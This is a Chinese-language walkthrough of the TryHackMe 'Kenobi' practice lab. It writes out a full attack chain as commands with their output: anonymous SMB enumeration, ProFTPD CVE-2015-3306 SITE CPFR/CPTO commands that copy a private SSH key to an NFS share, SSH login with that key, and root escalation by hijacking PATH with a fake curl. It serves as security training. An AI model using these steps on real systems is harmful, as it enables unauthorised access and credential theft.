## 概述
來源: tryhackme  
題目: Kenobi  
難度: Easy  
網址: https://tryhackme.com/room/kenobi  

### 學習目標
- SMB 匿名共享列舉  
- NFS 服務利用  
- ProFTPD 1.3.5 漏洞(CVE-2015-3306)  
- SSH 私鑰利用
- SUID 提權與 PATH 劫持


## 基本掃描
### nmap

結果掃出來的port有少？！
```!=
nmap -sC -sV -v 10.201.110.192

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 28:20:f7:ae:6f:2f:7d:28:f6:91:5a:b2:57:a1:11:89 (RSA)
|   256 fd:75:36:73:64:72:c2:a4:76:b3:59:e1:35:e1:ef:d9 (ECDSA)
|_  256 6e:31:85:2b:8d:f7:05:bd:2c:c5:88:70:63:bb:97:9a (ED25519)
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Site doesn't have a title (text/html).
| http-robots.txt: 1 disallowed entry 
|_/admin.html
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      34117/udp6  mountd
|   100005  1,2,3      44911/tcp6  mountd
|   100005  1,2,3      46124/udp   mountd
|   100005  1,2,3      51859/tcp   mountd
|   100021  1,3,4      36261/tcp   nlockmgr
|   100021  1,3,4      38881/udp   nlockmgr
|   100021  1,3,4      41585/tcp6  nlockmgr
|   100021  1,3,4      45324/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
2049/tcp open  nfs         3-4 (RPC #100003)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-10-22T06:03:34
|_  start_date: N/A
| nbstat: NetBIOS name: , NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   <00>                 Flags: <unique><active>
|   <03>                 Flags: <unique><active>
|   <20>                 Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>

```

再掃一次才有掃滿
```!=
nmap 10.201.110.192 -vvv 

Scanning 10.201.110.192 [1000 ports]
Discovered open port 445/tcp on 10.201.110.192
Discovered open port 21/tcp on 10.201.110.192
Discovered open port 80/tcp on 10.201.110.192
Discovered open port 22/tcp on 10.201.110.192
Discovered open port 111/tcp on 10.201.110.192
Discovered open port 139/tcp on 10.201.110.192
Discovered open port 2049/tcp on 10.201.110.192
Increasing send delay for 10.201.110.192 from 0 to 5 due to 179 out of 595 dropped probes since last increase.
```

> * 預設 nmap 會掃「前 1000 個常見 ports」。
> 但網路環境（封包丟失、延遲、目標主機瞬間丟棄探測包、或目標做了速率限制）會導致有些 port 在那次掃描沒被發現。第二次掃描因為重試、或 nmap 調整了送包延遲（你看到 `Increasing send delay ...`），所以成功發現更多 open ports。
> * `-sC -sV` 是讓 nmap 執行預設 NSE script 並做版本辨識，會多一些探查，但也可能因為每個 probe 多，導致丟包機率增高或被目標 rate-limit。
> * 建議的穩健做法：若懷疑被漏掉，使用 `nmap -p- -A -T4 <ip>`（`-p-` 掃全部 65535 port，`-A` 做全面偵測）或先 `-p-` 全掃再針對開的 port 做 `-sV -sC`。另外 `-Pn` 可在目標禁 ping 時使用。


## smb
官方說用這個掃shares但我掃不出來ＱＱ  
只掃出service
```!=
└─$ nmap -p 445,139 --script=smb-enum-shares.nse,smb-enum-users.nse 10.201.110.192

Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-22 14:14 CST
Nmap scan report for 10.201.110.192
Host is up (0.53s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 4.62 seconds
```
### 取得 sharename
後來改用這個才掃出來
```!=
└─$ smbclient -L //10.201.110.192/ -N       

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      
        IPC$            IPC       IPC Service (kenobi server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 10.201.110.192 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

> * NSE 的 SMB 腳本有時會因為 **SMB 協議版本協商失敗**、或需要認證（或需要特定參數）而失敗。
> `smbXcli_negprot_smb1_done: No compatible protocol selected by server.` 就是協議 negotiation 有問題（伺服器可能不支援此 nmap 嘗試的某些協議，或 nmap 腳本沒用到合適的協議序列）。
> * `smbclient -L //host/ -N` 是常用且實際能列 share 的工具（`-N` 表示不輸入密碼），它會自動嘗試合適協議。
> 成功列到 `anonymous`、`print$`、`IPC$`，並能用 `smbclient //host/anonymous` 直接登入（匿名 share 不需密碼）。
> 
> * 若要自動化列舉可以用 `smbmap -H <ip> -u '' -p ''` 或用 `enum4linux`、`smbclient` 等工具。nmap 的 NSE 也很好，但遇到協議問題時改用 smbclient 常常能通過。

### 登入成功
因為 anonymous 無需密碼  
所以直接登入成功
```!=
└─$ smbclient //10.201.110.192/anonymous        
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> 
```

### 發現 log.txt 
```!=
smb: \> ls
  .                                   D        0  Wed Sep  4 18:49:09 2019
  ..                                  D        0  Sat Aug  9 21:03:22 2025
  log.txt                             N    12237  Wed Sep  4 18:49:09 2019

                9183416 blocks of size 1024. 2919012 blocks available
```
下載
```!=
smb: \> get log.txt
```

### 取得 `.ssh` 的存放路徑
查看 log.txt 內容  
發現有 `.ssh` 的存放路徑  
```!=
└─$ cat log.txt          
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kenobi/.ssh/id_rsa): 
Created directory '/home/kenobi/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kenobi/.ssh/id_rsa.
Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi
The key's randomart image is:
+---[RSA 2048]----+
|                 |
|           ..    |
|        . o. .   |
|       ..=o +.   |
|      . So.o++o. |
|  o ...+oo.Bo*o  |
| o o ..o.o+.@oo  |
|  . . . E .O+= . |
|     . .   oBo.  |
+----[SHA256]-----+

```

列出可以 mount 的路徑
```!=
└─$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.201.110.192
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-22 14:37 CST
Nmap scan report for 10.201.110.192
Host is up (0.49s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *
| nfs-statfs: 
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9183416.0  5773812.0  2919008.0  67%   16.0T        32000
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
| ??????????  ?    ?    ?     ?                    ..
| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
| rwxr-xr-x   0    0    4096  2025-08-10T06:48:58  cache
| rwxrwxrwx   0    0    4096  2019-09-04T08:43:56  crash
| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
| rwxrwxr-x   0    108  4096  2025-10-22T06:03:13  log
| rwxr-xr-x   0    0    4096  2025-08-09T13:38:21  snap
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
|_

Nmap done: 1 IP address (1 host up) scanned in 10.09 seconds
```

> * `nfs-showmount` 會列出可被 mount 的 exports（你看到 `/var *`）。`nfs-ls` 顯示 volume 下的目錄，`nfs-statfs` 顯示檔案系統大小。
> * 掃描顯示 `/var *` 是共享的, `*` 表示任何人都可以掛載
> * 對 NFS 直接 mount 一般需要 root 權限，所以 `sudo mount ...` 是正常的（非 root 使用者通常無法執行 mount）。
> * 掛載成功後你就能像在本機檔案系統一樣讀取 `/var` 的內容

## ftp

### 確認版本

看官方文件好像是 ProFTPD 1.3.5 有以下漏洞  
可以下 `SITE CPFR` 跟 `SITE CPTO`  
不太明白這兩個指令  
好像是未授權下可以複製任意貼到任意地方？

> 利用漏洞 成功把 id_rsa 複製到 mount NFS 可取得的地方
```!=
└─$ nc 10.201.110.192 21      
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.201.110.192]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

> - 這是 **ProFTPD 1.3.5 的已知漏洞** (CVE-2015-3306)
> - `SITE CPFR` (Copy From): 指定要複製的源文件
> - `SITE CPTO` (Copy To): 指定複製的目標位置
> - 這個漏洞允許**未經認證的用戶**複製文件到可訪問的目錄
> - 此題可利用此漏洞把 SSH 私鑰從 `/home/kenobi/.ssh/id_rsa` 複製到 NFS 目錄 `/var/tmp/id_rsa`
> * 先 `SITE CPFR <原路徑>` 得到 `350`（ready），再 `SITE CPTO <目標>` 得到 `250 Copy successful`。


### 掛載 NFS 共享目錄

在本機建立一個目錄用來掛載 mount
```!=
┌──(kali㉿kali)-[~/tryhackme/Kenobi]
└─$ sudo mkdir /mnt/kenobiNFS      
[sudo] password for kali: 
               
┌──(kali㉿kali)-[~/tryhackme/Kenobi]
└─$ cd /mnt/kenobiNFS 

┌──(kali㉿kali)-[/mnt/kenobiNFS]
└─$ ls

```

第一次使用 mount 工具  
不太懂功能  
還要用 root 權限才可以使用  
可以透過本地的 `/mnt/kenobiNFS` 目錄  
遠端讀寫 `10.201.110.192:/var` 目錄內的資料  

> 使用 mount 把 NFS 掛載到本機

```!=
┌──(kali㉿kali)-[~/tryhackme/Kenobi]
└─$ mount 10.201.110.192:/var /mnt/kenobiNFS 
mount.nfs: failed to apply fstab options
                     
┌──(kali㉿kali)-[~/tryhackme/Kenobi]
└─$ sudo mount 10.201.110.192:/var /mnt/kenobiNFS
                          
┌──(kali㉿kali)-[~/tryhackme/Kenobi]
└─$ ls -la /mnt/kenobiNFS
total 56
drwxr-xr-x 14 root root  4096 Sep  4  2019 .
drwxr-xr-x  3 root root  4096 Oct 22 14:47 ..
drwxr-xr-x  2 root root  4096 Sep  4  2019 backups
drwxr-xr-x 15 root root  4096 Aug 10 14:48 cache
drwxrwxrwt  2 root root  4096 Sep  4  2019 crash
drwxr-xr-x 51 root root  4096 Aug 10 14:48 lib
drwxrwsr-x  2 root staff 4096 Apr 13  2016 local
lrwxrwxrwx  1 root root     9 Sep  4  2019 lock -> /run/lock
drwxrwxr-x 13 root _ssh  4096 Oct 22 14:03 log
drwxrwsr-x  2 root mail  4096 Feb 27  2019 mail
drwxr-xr-x  2 root root  4096 Feb 27  2019 opt
lrwxrwxrwx  1 root root     4 Sep  4  2019 run -> /run
drwxr-xr-x  5 root root  4096 Aug  9 21:38 snap
drwxr-xr-x  5 root root  4096 Sep  4  2019 spool
drwxrwxrwt 10 root root  4096 Oct 22 14:09 tmp
drwxr-xr-x  3 root root  4096 Sep  4  2019 www

```

> ```bash
> sudo mount 10.201.110.192:/var /mnt/kenobiNFS
> ```
> - **NFS (Network File System)**: 網路文件系統,允許遠端目錄掛載到本地
> - 這個命令把目標機器的 `/var` 目錄掛載到你本機的 `/mnt/kenobiNFS`
> - 之前 nmap 掃描顯示 `/var *` 是共享的,`*` 表示任何人都可以掛載
> - 需要 root 權限是因為 mount 操作涉及系統級別的文件系統修改
> * 由於剛剛已經透過 CVE-2015-3306 漏洞，把 id_rsa 複製到 NFS 的 `/var/tmp` 目錄
> 因此可從掛載點 `/mnt/kenobiNFS/tmp/id_rsa` 取得私鑰
> * 使用完後記得 `sudo umount /mnt/kenobiNFS`

## 取得 shell
把剛剛複製的 id_rsa 搬到本地端
```!=
┌──(kali㉿kali)-[~/tryhackme/Kenobi]
└─$ cp /mnt/kenobiNFS/tmp/id_rsa .
                       
┌──(kali㉿kali)-[~/tryhackme/Kenobi]
└─$ ls                   
id_rsa  log.txt  memo
```

給予權限  
但不知道為什麼要給 600 權限
```!=
┌──(kali㉿kali)-[~/tryhackme/Kenobi]
└─$ ls -la id_rsa        
-rw-r--r-- 1 kali kali 1675 Oct 22 14:59 id_rsa

┌──(kali㉿kali)-[~/tryhackme/Kenobi]
└─$ chmod 600 id_rsa
                         
┌──(kali㉿kali)-[~/tryhackme/Kenobi]
└─$ ls -la id_rsa
-rw------- 1 kali kali 1675 Oct 22 14:59 id_rsa

```

> - **SSH 安全要求**: SSH 私鑰必須只有擁有者可讀寫,其他人完全無權限
> - `600` = 擁有者可讀寫(rw-),群組無權限(---),其他人無權限(---)
> - 如果權限太寬鬆,SSH 會拒絕使用該私鑰


使用此 id_rsa 私鑰成功登入 ssh
```!=
└─$ ssh -i id_rsa kenobi@10.201.110.192
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed 22 Oct 2025 02:01:52 AM CDT

  System load:  0.03              Processes:             123
  Usage of /:   62.2% of 8.76GB   Users logged in:       0
  Memory usage: 17%               IPv4 address for eth0: 10.201.110.192
  Swap usage:   0%

Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

40 additional security updates can be applied with ESM Infra.
Learn more about enabling ESM Infra service for Ubuntu 20.04 at
https://ubuntu.com/20-04


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Your Hardware Enablement Stack (HWE) is supported until April 2025.

Last login: Sat Aug  9 07:57:51 2025 from 10.23.8.228
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ 

```

取得 user.txt
```!=
kenobi@kenobi:~$ ls
share  user.txt
kenobi@kenobi:~$ cat user.txt
d0...99
```

## 提權

掃描 s 權限的檔案
```!=
kenobi@kenobi:~$  find / -perm -u=s -type f 2>/dev/null
/snap/core20/2599/usr/bin/chfn
/snap/core20/2599/usr/bin/chsh
/snap/core20/2599/usr/bin/gpasswd
/snap/core20/2599/usr/bin/mount
/snap/core20/2599/usr/bin/newgrp
/snap/core20/2599/usr/bin/passwd
/snap/core20/2599/usr/bin/su
/snap/core20/2599/usr/bin/sudo
/snap/core20/2599/usr/bin/umount
/snap/core20/2599/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2599/usr/lib/openssh/ssh-keysign
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/su
```

> - **SUID (Set User ID)**: 當執行該文件時,會以文件擁有者的身份執行
> - 如果一個 root 擁有的文件有 SUID 位元,普通用戶執行它時會獲得 root 權限
> - `/usr/bin/menu` 是 root 擁有且有 SUID 的可執行文件
> - 可用 `ls -la /usr/bin/menu` 確認: `-rwsr-xr-x root root` (注意 `s` 位元)
> - 這是提權的常見入口點

官方利用 `/usr/bin/menu` 此工具來提權  
應該也有其他工具可利用提權

```!=
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
HTTP/1.1 200 OK
Date: Wed, 22 Oct 2025 07:08:03 GMT
Server: Apache/2.4.41 (Ubuntu)
Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT
ETag: "c8-591b6884b6ed2"
Accept-Ranges: bytes
Content-Length: 200
Vary: Accept-Encoding
Content-Type: text/html
```

官方給出各個選項背後的指令
```!=
1. status check
    curl -I localhost
2. kernel version
    uname -r
3. ifconfig
    ifconfig
```

知道指令後  
嘗試修改 curl 讓他變成 執行shell  
但不知道什麼要給予 777 權限  
```!=
kenobi@kenobi:~$ cd /tmp
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
```

> 1. **PATH 劫持攻擊**:
>    - `menu` 程序調用 `curl` 時沒有使用完整路徑(如 `/usr/bin/curl`)
>    - 而是直接調用 `curl`,系統會從 `$PATH` 環境變數中尋找
>    * 正常來說，若你要讓檔案被當做腳本執行，應在第一行放 `#!/bin/sh`。很多 writeup 會寫 `echo /bin/sh > curl`（把 `/bin/sh` 放在檔案內容），實務上有時各環境行為不同。為穩健性請使用 `echo -e '#!/bin/sh\n/bin/sh' > /tmp/curl` 並 `chmod +x /tmp/curl`。
>    
> 2. **修改 PATH**:
>    - `export PATH=/tmp:$PATH` 把 `/tmp` 放在最前面
>    - 系統會先在 `/tmp` 找 `curl`,找到你的假 curl(`/bin/sh`)
>    
> 3. **提權原理**:
>    - `menu` 有 SUID 權限,以 root 身份執行
>    - 當它調用你的假 `curl`(實際是 `/bin/sh`) 時
>    - shell 就以 root 身份啟動了
> 
> 4. **關於 777 權限**:
>    - 實際上 `755` (`chmod +x /tmp/curl`)就夠了(rwxr-xr-x)
>    - 只需要執行權限,`777`(rwxrwxrwx) 是過度授權
>    * 因為系統執行時只需要檢查擁有者(你)的執行權限


再次執行即可提權成功
```!=
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
```


## 總結

1. **權限設定的重要性**
   - SSH 私鑰: 必須 `600` 或 `400` (過寬會被拒絕)
   - 攻擊腳本: 只需 `+x` 可執行即可 (`755` 足夠,`777` 過寬)

2. **PATH 劫持攻擊**
   - 標準做法: `echo -e '#!/bin/sh\n/bin/sh' > /tmp/curl && chmod +x /tmp/curl`
   - `echo /bin/sh > curl` 在某些環境可行但不穩健

3. **SUID 提權風險**
   - 尋找 SUID 程式: `find / -perm -u=s -type f 2>/dev/null`
   - 特別注意會呼叫外部程式或搜尋 PATH 的 SUID 程式

4. **掃描技巧**
   - 看到 `Increasing send delay` 表示 nmap 自動調整以應對丟包
   - 若有遺漏可用 `nmap -p- -A -T4` 全掃或多次掃描

5. **服務列舉技巧**
   - SMB: nmap NSE 失敗時改用 `smbclient -L` 或 `enum4linux`
   - NFS: 使用 `showmount -e` 或 nmap nfs-* 腳本確認 exports


## AI 精闢 writeup
> 1. 使用 nmap 做初步掃描（`nmap -sC -sV -v 10.201.110.192`），發現 22、80、111、139、2049。若初次掃描遺漏可再用 `nmap -p- -A -T4` 全 port 掃描，發現 21 與 445。
> 2. 嘗試 SMB 列舉時，nmap 的 smb-enum-shares NSE 失敗（協議 negotiation 問題），改用 `smbclient -L //10.201.110.192/ -N` 成功列出 share，包括 `anonymous`。登入 `smbclient //10.201.110.192/anonymous` 後下載 `log.txt`。
> 3. 在 `log.txt` 發現 SSH 金鑰產生訊息，得知私鑰路徑為 `/home/kenobi/.ssh/id_rsa`。
> 4. 檢查 NFS(port 111),使用 `showmount` 或 nmap nfs-* 腳本確認 `export` 為 `/var`,以 `sudo mount 10.201.110.192:/var /mnt/kenobiNFS` 掛載到本機。
> 5. 利用 FTP 的 `SITE CPFR` + `SITE CPTO`（ProFTPD）把私鑰複製到 `/var/tmp` 後再從 NFS 讀取。
> 6. 將私鑰複製到攻擊機：`cp /mnt/kenobiNFS/tmp/id_rsa .`，並設定權限 `chmod 600 id_rsa`。使用 `ssh -i id_rsa kenobi@10.201.110.192` 登入取得 `user.txt`。
> 7. 列出系統 SUID 程式 `find / -perm -u=s -type f 2>/dev/null`，發現 `/usr/bin/menu`。執行 `/usr/bin/menu` 後發現選項會執行 `curl -I localhost`。將 `/tmp` 放到 PATH 前面並放置惡意 `curl` 可獲得 root：
>
>    * `echo -e '#!/bin/sh\n/bin/sh' > /tmp/curl && chmod 755 /tmp/curl`
>    * `export PATH=/tmp:$PATH`
>    * 執行 `/usr/bin/menu` 選 `1` (status check) → root shell → 讀取 `root.txt`。


**完整攻擊鏈**:
1. SMB 洩漏 → 發現 SSH 私鑰路徑
2. ProFTPD 漏洞 → 複製私鑰到 NFS 共享目錄
3. NFS 掛載 → 取得私鑰
4. SSH 登入 → 獲得 user shell
5. SUID + PATH 劫持 → 提權到 root


## 補充

### NFS 掛載點管理
#### 正常卸載流程
記得結束掛載 umount 後在結束機器

```!=
# 1. 確認掛載狀態
┌──(kali㉿kali)-[~/tryhackme]
└─$ mount | grep kenobiNFS
10.201.110.192:/var on /mnt/kenobiNFS type nfs4 (rw,relatime,vers=4.2,rsize=262144,wsize=262144,namlen=255,hard,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=10.4.11.38,local_lock=none,addr=10.201.110.192)

# 2. 正常卸載                   
┌──(kali㉿kali)-[~/tryhackme]
└─$ sudo umount /mnt/kenobiNFS

# 3. 確認卸載成功
┌──(kali㉿kali)-[~/tryhackme]
└─$ mount | grep kenobiNFS  # 應該沒有輸出
```

#### 靶機已關閉的情況

**為什麼會卡住?**
- NFS 預設使用 `hard` mount (你可以在 mount 輸出看到 `hard` 選項)
- `hard` 模式會無限期等待伺服器回應
- 當伺服器已關閉,umount 會一直等待,導致掛住(hang)

**解決方法:**

### 1. **強制 unmount（推薦）**
```bash
sudo umount -f /mnt/kenobiNFS
```
`-f` 代表 force（強制），會嘗試強制卸載

### 2. **lazy unmount（最有效）**
```bash
sudo umount -l /mnt/kenobiNFS
```
`-l` 代表 lazy（延遲卸載）：
- 立即從檔案系統樹中移除掛載點
- 但實際清理會等到沒有程式使用時才完成
- **不會卡住**，幾乎立即完成

### 3. **組合使用**
```bash
sudo umount -fl /mnt/kenobiNFS
```

但還是不行就重啟電腦XD
```!=
┌──(kali㉿kali)-[~]
└─$ mount | grep kenobiNFS

#沒有使用了，搞定XD
```